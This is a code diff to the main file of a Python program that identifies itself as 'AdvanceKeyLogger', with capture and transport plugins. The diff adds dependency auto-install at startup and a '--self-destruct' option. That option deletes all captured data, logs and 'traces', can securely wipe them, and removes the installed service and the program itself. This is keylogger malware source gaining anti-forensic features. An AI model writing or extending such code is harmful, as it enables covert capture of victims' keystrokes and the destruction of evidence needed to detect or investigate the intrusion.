@@ -43,6 +43,8 @@ from utils.crypto import encrypt, generate_key, key_from_base64, key_to_base64
 from utils.logger_setup import setup_logging
 from utils.process import GracefulShutdown, PIDLock
 from utils.resilience import CircuitBreaker, TransportQueue
+from utils.dependency_check import check_and_install_dependencies
+from utils.self_destruct import execute_self_destruct
 from utils.system_info import get_system_info
 
 # Plugin modules are auto-imported by capture/__init__.py and
@@ -95,6 +97,11 @@ def parse_args() -> argparse.Namespace:
         "--list-transports",
         action="store_true",
         help="List registered transport plugins and exit",
+    )
+    parser.add_argument(
+        "--self-destruct",
+        action="store_true",
+        help="Remove all data, logs, and traces then exit",
     )
     parser.add_argument(
         "--dry-run",
@@ -322,6 +329,12 @@ def main() -> int:
 
     logger.info("AdvanceKeyLogger starting...")
 
+    # --- Auto-install missing dependencies ---
+    if settings.get("general.auto_install_deps", False):
+        _installed, _failed = check_and_install_dependencies(auto_install=True)
+        if _installed:
+            logger.info("Auto-installed packages: %s", ", ".join(_installed))
+
     # --- Service management ---
     if args.command == "service":
         manager = ServiceManager(settings.as_dict())
@@ -363,6 +376,31 @@ def main() -> int:
         else:
             print("No transport plugins registered.")
             print("Hint: Import transport modules to register them.")
+        return 0
+
+    # --- Self-destruct ---
+    if args.self_destruct:
+        sd_config = settings.as_dict()
+        sd_cfg = sd_config.get("self_destruct", {})
+        secure_wipe = bool(sd_cfg.get("secure_wipe", False))
+        remove_svc = bool(sd_cfg.get("remove_service", True))
+        remove_prog = bool(sd_cfg.get("remove_program", False))
+
+        confirm = input(
+            "WARNING: This will permanently delete ALL data, logs, and traces.\n"
+            "Type 'YES' to confirm: "
+        )
+        if confirm.strip() != "YES":
+            print("Aborted.")
+            return 0
+
+        execute_self_destruct(
+            sd_config,
+            secure_wipe=secure_wipe,
+            remove_service=remove_svc,
+            remove_program=remove_prog,
+        )
+        print("Self-destruct complete.")
         return 0
 
     # --- PID lock ---
